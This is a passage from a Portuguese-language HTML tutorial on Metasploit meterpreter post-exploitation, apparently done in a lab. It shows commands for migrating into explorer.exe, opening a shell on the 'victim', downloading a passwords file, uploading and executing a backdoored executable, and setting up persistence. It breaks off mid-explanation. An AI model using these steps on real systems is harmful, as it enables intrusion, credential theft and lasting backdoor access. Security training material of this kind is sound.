font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; sessions -i [id da sessão]</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">- interage com certa sessão </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; sysinfo</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> - mostra informações da máquina</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; ipconfig</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> - exibe as interfaces e endereços da rede na máquina remota.</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; getuid</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> - mostra o usuário ativo no momento</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; ps </span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">- Exibe uma lista de processos em execução no alvo.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="239" src="https://lh6.googleusercontent.com/wOupjUlxEaH9gg9SktrG1S_le7bOkWEQw2x37oLC8skAVQc1RIuOYHAO1XhyfQMSFt0GkmnWvImlaolCXk0bDhAST6D2du0C5ezYPU0NGneGOq1toSuxFbuYeT-xkns4N1853O9F" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="297" src="https://lh3.googleusercontent.com/Z_eUb29136Cns_WBWqb0Oqbl_553mbjH7_-vJZw2Yv0yl_tk7E2MMDLWelTdJF6aF-VNsEPnmDuKfcOykuPgHVE1tRId32Hd-9BPUzjibAah2Btk23t3e-Py2GQhTn9-5O7Oqnrm" style="border: none; transform: rotate(0rad);" width="551" /></span></div><br /><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 16pt; margin-top: 0pt;"><span style="color: #666666; font-family: &quot;arial&quot;; font-size: 15pt; vertical-align: baseline; white-space: pre-wrap;">Mantendo conexão mesmo após o alvo reiniciar</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 16pt; margin-top: 0pt;"><span style="color: #666666; font-family: &quot;arial&quot;; font-size: 15pt; vertical-align: baseline; white-space: pre-wrap;">Comando Migrate</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Migrar o nosso processo para outro, se estivermos rodando em algum processo e o alvo desligar perderemos a conexão, por isso devemos procurar um processo que o alvo não vai fechar. Um bom processo é o explorer, pois como ele é a interface gráfica do windows o alvo nunca fechará ele.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; PS</span><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"> - Exibe uma lista de processos em execução no alvo.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="296" src="https://lh3.googleusercontent.com/no-cGor9NbhFRwEwGGso-lAB8RSfsLlgWZFFdLEMYf4npLJMXE_js6hbyo8B4GSUlKiIPql79iHNmmbpzbz8cJS9vnHD86KWTmpRTitUNJ_CLNyHXLYHRAkX83U9fFgP2p0ysTRT" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Muito útil pois podemos ver todos os programas rodando, podemos ver o ID.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">um processo interessante é o explorer que está rodando no id 2116. Uma boa ideia é migrar o nosso processo para um processo seguro no qual estará sempre ativo. o Explorer é a interface gráfica e sempre vai estar funcionando</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="17" src="https://lh6.googleusercontent.com/AWNcNifDcAx3cHV8-ihmwcNcOwr97N2lLum7DaCtNHKvmNguGxHnI0zQT9zcXmxUEl-ieRSBKSCvB0umJcOQpgvIP4CDTu_8qWYNGiKdj18o4BQvJb33rc_RG3-PmKZvtoZ8SG4G" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Agora só precisamos fazer o comando</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; migrate 2116</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="97" src="https://lh6.googleusercontent.com/OA9dDfH_xcc00_IsANlpJx6h86v8xUGqP_C1tzPbPb9WUndlLwCIuL_UJQsG_3DOO9OUmns3zJIdCDp2SP-yjgC0VXTJvSwN_B321VVPKd5fq4TXc-d_1aDqjaw1-gdaBKIgXcRi" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Se formos no alvo e rodarmos o resource monitor veremos que o explorer.exe com o PID(process id) está rodando na porta 8080, a mesma de nosso Backdoor.</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="699" src="https://lh6.googleusercontent.com/5GSN8C27wd7-bhWOdamkLPt-uvUfxOD8qO5ZInwMQrXkmw3jdcb5dj-tGr7WBcgzY0wiulHyESVqlKK9ardVTeooKZzf6K1PQ8H22GfPoPI19ior3XrGUlt0nVvhE82dvQsflsB4" style="border: none; transform: rotate(0rad);" width="602" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Isso é um pouco suspeito pois não é uma porta normal para o Explorer, mas se fizermos migration para algum navegador não será suspeito. </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O módulo migrate não funciona no Mac OS.</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 16pt; margin-top: 0pt;"><span style="color: #666666; font-family: &quot;arial&quot;; font-size: 15pt; vertical-align: baseline; white-space: pre-wrap;">Abrir um prompt de comando na vítima</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Outra ferramenta interessante é o comando shell, com ele você abre um comando shell no alvo. </span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; shell</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">abrimos um prompt do windows &nbsp;e podemos usar qualquer comando </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="187" src="https://lh4.googleusercontent.com/OYJFckQRDjXtv4G7AMeaMfHLbJvoKCIlRfYcLKHMknquwp6Js78nplrA0nmdAxwwryeN1rnlwjoZcTGOdK-JkOE6oEqdPT0qIJI1kIJzrVoNGNwWNeSQKS7ad26zYUHvc7rJAPYC" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">veja mais comandos básicos do meterpreter aqui:</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><a href="https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/" style="text-decoration-line: none;"><span style="color: #1155cc; font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/</span></a></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 16pt; margin-top: 0pt;"><span style="color: #666666; font-family: &quot;arial&quot;; font-size: 15pt; vertical-align: baseline; white-space: pre-wrap;">Comandos de arquivos do sistema</span></div><h2 dir="ltr" style="line-height: 1.68; margin-bottom: 10pt; margin-top: 0pt;"><span style="background-color: white; font-family: &quot;arial&quot;; font-size: 26.5pt; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;">File System Commands</span></h2><ul style="margin-bottom: 0pt; margin-top: 0pt;"><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">cat</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - read and print the contents of a file</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">cd</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - change directory on the victim</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">del</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - delete a file on the victim</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">download</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - download a file from the victim system to the attacker system</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">edit</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - edit a file with vim</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">getlwd</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - print the local directory</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">getwd</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - print working directory</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">lcd</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - change local directory</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">lpwd</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - print local directory</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">ls</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - list files in current directory</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">mkdir</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - make a directory on the victim system</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">pwd</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - print working directory</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">rm</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - delete a file</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">rmdir</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> - remove directory on the victim system</span></div></li><li dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: disc; vertical-align: baseline; white-space: pre;"><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">upload </span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">- upload a file from the attacker system to the victim</span></div></li></ul><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Com esses comandos podemos ler, editar, baixar, enviar, rodar e deletar arquivos da vítima</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 16pt; margin-top: 0pt;"><span style="color: #666666; font-family: &quot;arial&quot;; font-size: 15pt; vertical-align: baseline; white-space: pre-wrap;">Manipular arquivos</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Para ver onde estamos</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; pwd</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Para ver os arquivos disponíveis</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; ls </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; cd IEUser</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; cd downolads</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; ls</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="509" src="https://lh4.googleusercontent.com/uo5izEn1yxorskOWMxb-o-8OiNg6FQbx8JYew9hW46G9FPv8pxqB9SzfPRUWAn-W542hnnkxZg7MS6wKRHxhwwj8fG_4XnICnTkh2RwQ61d05ERZfs3XPYNc66Sn4RXLZWpb6hPK" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Podemos ver um arquivo que parece interessante, passwords.txt</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Para ler ele só precisa realizar o comando cat</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; cat passwords.txt</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="134" src="https://lh6.googleusercontent.com/uYYW0vP_DQ2yXAwYHexnt9zlQOSiPnZ-LVOVrPFa27SPhI6TmjeCL7in64D3_6ZHQKOTnyL2U_PBXV2n2fF18kfhDitLoMg9iCwIHg6iOWq8u8A-R5zjOmY3RxUi0d391yftVmxG" style="border: none; transform: rotate(0rad);" width="388" /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><br /></span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">O resultado é o texto do arquivo</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">test1</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">test2</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Como podemos verificar na vítima</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="287" src="https://lh6.googleusercontent.com/Vrq6quZ808IrQpq6qpL4yR3hcA1APAdGE-ui5-6Srs7qa2vBlUTbUFOY0ztyJSon2CGA1791v37gTjKVgFnTOxWZxkmgLPbjUjPJ3KzAB9tsvzlLIqdMxawG6kF9fwKGp4id7vt7" style="border: none; transform: rotate(0rad);" width="382" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">para fazer downolad desse texto podemos fazer o comando</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; download passwords.text</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 16pt; margin-top: 0pt;"><span style="color: #666666; font-family: &quot;arial&quot;; font-size: 15pt; vertical-align: baseline; white-space: pre-wrap;">Upload e executar</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Se quisermos abrir algum backdoor na vítima ou virus podemos com um comando simples e intuitivo</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">upload[nome do arquivo]</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; upload backdoored-calc.exe</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Para executar esse arquivo no alvo usamos o comando execute -f [nome do arquivo]</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; execute backdoored-calc.exe</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">podemos usar isso com um keylogger, virus ou qualquer outro arquivo</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="265" src="https://lh5.googleusercontent.com/BQR1_l256hYPMdVTj2LIonRYGDOWktBrjo0nP8PwLKkkLoqnvPa88yrABYmgs3JoAmiKJ6D7--cywfFT7hFN8inzXGEQhrOqavBLEA4wuerSC9Stp1fq4yQLFvuWWVxehmm8BkDe" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 3pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 26pt; vertical-align: baseline; white-space: pre-wrap;">Mantendo acesso ao alvo - persistência</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Fazemos o comando que aciona o help do módulo de persistência </span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; run persistence -h</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;"><img height="248" src="https://lh6.googleusercontent.com/w_dJN7QLJ3UvTj0OefzZrPNHq_EvKLu1sWFKLK8NT5DL29mf0b0o5aa-qW_QHsB7v1nTE9CcuBrc1AvfrE6NTqKT1AriFI8Psq6gAXt81fx5VNrQ-OSv_39z25E8Zq96U4PSVvRZ" style="border: none; transform: rotate(0rad);" width="602" /></span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">Para iniciar efetuamos o comando</span></div><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&gt; run persistence -U -i 20 -p 80</span></div><br /><div dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: &quot;arial&quot;; font-size: 11pt; vertical-align: baseline; white-space: pre-wrap;">U - sempre que o alvo ligar o agente vai acionar</span></div><div 